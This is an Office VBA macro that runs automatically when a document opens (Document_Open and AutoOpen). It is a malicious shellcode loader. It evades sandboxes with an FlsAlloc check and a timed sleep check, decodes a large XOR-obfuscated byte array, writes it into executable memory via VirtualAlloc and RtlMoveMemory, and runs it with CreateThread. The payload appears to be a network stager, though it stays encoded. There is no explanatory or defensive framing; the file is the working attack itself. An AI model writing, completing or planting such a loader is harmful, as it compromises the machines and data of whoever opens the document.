Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr
Private Declare PtrSafe Function FlsAlloc Lib "KERNEL32" (ByVal callback As LongPtr) As LongPtr

Sub MyMacro()
Dim allocRes As LongPtr
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    
    ' Call FlsAlloc and verify if the result exists
    allocRes = FlsAlloc(0)
    If IsNull(allocRes) Then
        End
    End If
    
    ' Sleep for 10 seconds and verify time passed
    t1 = Now()
    Sleep (10000)
    t2 = Now()
    time = DateDiff("s", t1, t2)
    If time < 10 Then
        Exit Sub
    End If

buf = Array ( 4, 16, 107, 248, 248, 248, 152, 113, 29, 201, 46, 156, 119, 174, 200, 119, 174, 244, 119, 174, 236, 119, 142, 208, 201, 251, 235, 67, 182, 210, 201, 56, 84, 196, 153, 132, 254, 212, 216, 57, 43, 245, 249, 51, 177, 141, 11, 174, 163, 119, _
174, 232, 119, 190, 196, 249, 40, 119, 184, 128, 125, 56, 140, 180, 249, 40, 119, 160, 216, 168, 119, 176, 224, 249, 47, 125, 49, 140, 196, 177, 119, 204, 119, 201, 251, 249, 34, 201, 56, 84, 57, 43, 245, 249, 51, 192, 24, 141, 12, 255, _
133, 0, 199, 133, 220, 141, 24, 160, 119, 160, 220, 249, 47, 146, 119, 244, 183, 119, 160, 228, 249, 47, 119, 252, 119, 249, 40, 113, 188, 220, 220, 167, 167, 153, 161, 166, 169, 251, 24, 160, 155, 166, 119, 238, 17, 120, 251, 251, 251, 165, _
144, 138, 157, 140, 248, 144, 131, 145, 138, 145, 172, 144, 180, 131, 210, 243, 251, 45, 201, 39, 175, 175, 175, 175, 175, 16, 143, 248, 248, 248, 181, 139, 134, 145, 148, 148, 153, 203, 205, 202, 200, 216, 208, 181, 153, 159, 145, 138, 140, 139, _
143, 144, 199, 216, 177, 138, 140, 157, 148, 216, 181, 153, 159, 216, 171, 175, 216, 160, 216, 201, 207, 155, 201, 209, 216, 185, 136, 136, 148, 157, 163, 157, 158, 183, 145, 140, 203, 194, 200, 205, 202, 201, 202, 201, 205, 216, 208, 183, 176, 172, _
181, 180, 212, 216, 148, 145, 151, 157, 216, 179, 157, 159, 151, 139, 209, 216, 162, 157, 142, 143, 145, 139, 138, 203, 201, 194, 202, 201, 216, 175, 153, 146, 153, 142, 145, 203, 194, 200, 205, 202, 201, 202, 201, 205, 248, 144, 198, 162, 129, 83, _
251, 45, 175, 175, 150, 255, 175, 175, 144, 71, 249, 248, 248, 16, 176, 249, 248, 248, 203, 173, 189, 193, 183, 175, 148, 170, 171, 163, 193, 173, 145, 173, 145, 170, 172, 174, 147, 128, 172, 173, 131, 201, 156, 170, 156, 131, 149, 206, 191, 162, _
188, 201, 178, 213, 201, 177, 138, 138, 134, 136, 181, 200, 157, 148, 200, 177, 192, 156, 162, 173, 137, 138, 175, 157, 172, 201, 178, 194, 149, 180, 146, 168, 190, 130, 150, 204, 138, 150, 194, 146, 130, 194, 140, 162, 192, 169, 130, 159, 188, 140, _
128, 158, 160, 205, 159, 150, 195, 155, 153, 180, 200, 163, 147, 148, 155, 179, 156, 150, 141, 161, 159, 194, 139, 185, 172, 142, 147, 201, 158, 207, 177, 177, 169, 153, 136, 141, 174, 180, 158, 179, 149, 204, 129, 130, 195, 155, 142, 200, 200, 206, _
201, 170, 192, 207, 150, 128, 173, 159, 146, 146, 173, 191, 141, 176, 181, 172, 173, 191, 207, 170, 148, 146, 182, 206, 143, 190, 147, 188, 143, 194, 142, 144, 190, 179, 188, 142, 161, 130, 155, 195, 137, 130, 192, 194, 151, 153, 193, 141, 147, 148, _
180, 183, 248, 168, 144, 163, 113, 91, 50, 251, 45, 113, 50, 175, 144, 248, 206, 16, 124, 175, 175, 175, 163, 175, 162, 144, 23, 173, 202, 199, 251, 45, 98, 150, 246, 155, 144, 120, 207, 248, 248, 113, 24, 150, 252, 168, 150, 219, 162, 144, _
141, 178, 90, 114, 251, 45, 175, 175, 175, 175, 162, 144, 213, 242, 224, 135, 251, 45, 125, 56, 141, 236, 144, 112, 239, 248, 248, 144, 188, 8, 205, 24, 251, 45, 171, 141, 53, 16, 183, 248, 248, 248, 150, 184, 144, 248, 232, 248, 248, 144, _
248, 248, 184, 248, 175, 144, 160, 92, 175, 29, 251, 45, 111, 175, 175, 113, 19, 163, 144, 248, 216, 248, 248, 175, 162, 144, 238, 98, 113, 30, 251, 45, 125, 56, 140, 43, 119, 243, 249, 63, 125, 56, 141, 29, 160, 63, 155, 16, 151, 251, _
251, 251, 201, 193, 206, 202, 201, 194, 192, 202, 204, 205, 202, 206, 200, 194, 248, 71, 24, 229, 214, 246, 144, 82, 109, 69, 101, 251, 45, 196, 242, 132, 246, 120, 7, 24, 141, 253, 71, 179, 239, 142, 139, 150, 248, 175, 251, 45,  )


    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)

   

    For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor 250
    Next i
    
     For i = 0 To UBound(buf) 
buf(i) = buf(i) - 2
Next i

    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter


    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub
Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
